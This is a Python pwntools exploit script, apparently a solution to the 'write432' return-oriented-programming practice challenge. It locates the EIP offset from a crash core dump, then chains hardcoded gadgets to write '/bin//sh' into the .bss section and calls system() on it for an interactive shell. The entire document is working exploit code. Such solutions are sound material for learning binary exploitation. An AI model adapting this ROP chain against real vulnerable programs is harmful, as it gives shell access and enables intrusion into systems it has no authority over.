from pwn import *

e = ELF("./write432")
p = process(e.path)
p.sendline(cyclic(1000))
p.wait()
core = p.corefile
eip_offset = cyclic_find(core.eip)

info("Found eip offset %d", eip_offset)

p = process(e.path)

bss_addr = 0x0804a040
pop_edi = 0x080486da #BBBB
mov_edi_ebp = 0x08048670
pop_ebp = 0x080486db
system = e.symbols["system"]

payload = cyclic(eip_offset)
payload += p32(pop_edi)
payload += p32(bss_addr)
payload += "BBBB"
payload += p32(pop_ebp)
payload += "/bin"
payload += p32(mov_edi_ebp)
payload += p32(pop_edi)
payload += p32(bss_addr+4)
payload += "BBBB"
payload += p32(pop_ebp)
payload += "//sh"
payload += p32(mov_edi_ebp)

payload += p32(system)
payload += "BBBB"
payload += p32(bss_addr)

p.sendline(payload)
p.interactive()
